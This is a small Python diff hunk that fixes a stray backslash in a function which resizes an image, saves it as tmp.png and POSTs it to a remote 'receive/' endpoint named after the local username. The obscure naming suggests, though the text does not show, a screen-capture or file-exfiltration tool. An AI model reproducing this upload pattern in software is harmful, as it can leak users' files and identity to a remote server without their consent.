@@ -26,7 +26,7 @@ def a():
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
         print('e')
-        with open('tmp.png', 'rb') as imgbytes:\
+        with open('tmp.png', 'rb') as imgbytes:
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
     except Exception as e:
         print(e)
